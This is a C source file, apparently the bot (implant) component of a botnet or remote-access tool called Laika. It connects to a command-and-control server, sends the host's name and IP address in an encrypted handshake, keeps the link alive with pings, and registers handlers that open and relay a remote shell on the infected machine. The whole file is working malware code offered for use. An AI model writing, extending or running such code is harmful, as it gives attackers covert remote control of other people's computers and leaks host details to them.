#include "lmem.h"
#include "lsodium.h"
#include "lerror.h"
#include "bot.h"
#include "shell.h"

void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
    uint8_t endianness = laikaS_readByte(&peer->sock);

    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"));
}

void laikaB_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    LAIKA_DEBUG("got ping from cnc!\n");
    /* stubbed */
}

/* =============================================[[ Packet Tables ]]============================================== */

struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
        laikaB_handleHandshakeResponse,
        sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PINGPONG,
        laikaB_handlePing,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_OPEN,
        laikaB_handleShellOpen,
        sizeof(uint16_t) + sizeof(uint16_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        laikaB_handleShellClose,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        laikaB_handleShellData,
        0,
    true),
};

/* socket event */
void laikaB_onPollFail(struct sLaika_socket *sock, void *uData) {
    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    laikaS_kill(&bot->peer->sock);
}

/* ==================================================[[ Bot ]]=================================================== */

struct sLaika_bot *laikaB_newBot(void) {
    struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
    struct hostent *host;
    char *tempINBuf;
    size_t _unused;

    laikaP_initPList(&bot->pList);
    bot->peer = laikaS_newPeer(
        laikaB_pktTbl,
        &bot->pList,
        laikaB_onPollFail,
        (void*)bot,
        (void*)bot
    );

    laikaT_initTaskService(&bot->tService);
    laikaT_newTask(&bot->tService, 5000, laikaB_pingTask, (void*)bot);

    bot->shell = NULL;
    bot->shellTask = NULL;

    /* generate keypair */
    if (sodium_init() < 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (!laikaK_genKeys(bot->pub, bot->priv)) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to gen keypair!\n");
    }

    /* read cnc's public key into peerPub */
    if (!laikaK_loadKeys(bot->peer->peerPub, NULL, LAIKA_PUBKEY, NULL)) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }

    /* grab hostname & ip info */
    if (SOCKETERROR(gethostname(bot->peer->hostname, LAIKA_HOSTNAME_LEN))) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("gethostname() failed!\n");
    }

    if ((host = gethostbyname(bot->peer->hostname)) == NULL) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("gethostbyname() failed!\n");
    }

    if ((tempINBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("inet_ntoa() failed!\n");
    }

    /* copy inet address info */
    strcpy(bot->peer->inet, tempINBuf);
    return bot;
}

void laikaB_freeBot(struct sLaika_bot *bot) {
    int i;

    /* clear shell */
    if (bot->shell)
        laikaB_freeShell(bot, bot->shell);

    laikaP_cleanPList(&bot->pList);
    laikaS_freePeer(bot->peer);
    laikaT_cleanTaskService(&bot->tService);
    laikaM_free(bot);
}

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
    struct sLaika_socket *sock = &bot->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&bot->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(bot->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_writeByte(sock, LAIKA_OSTYPE);
    laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
    laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_write(sock, bot->peer->inet, LAIKA_INET_LEN);
    laikaS_endOutPacket(bot->peer);
    laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */

    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");
}

bool laikaB_poll(struct sLaika_bot *bot) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    /* flush any events prior (eg. made by a task) */
    laikaP_flushOutQueue(&bot->pList);
    evnt = laikaP_poll(&bot->pList, laikaT_timeTillTask(&bot->tService), &numEvents);

    /* no events? timeout was reached */
    if (numEvents == 0) {
        laikaT_pollTasks(&bot->tService);
        return false;
    }

    laikaP_handleEvent(evnt);

    /* flush any events after (eg. made by a packet handler) */
    laikaP_flushOutQueue(&bot->pList);
    return true;
}

void laikaB_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    laikaS_emptyOutPacket(bot->peer, LAIKAPKT_PINGPONG);
}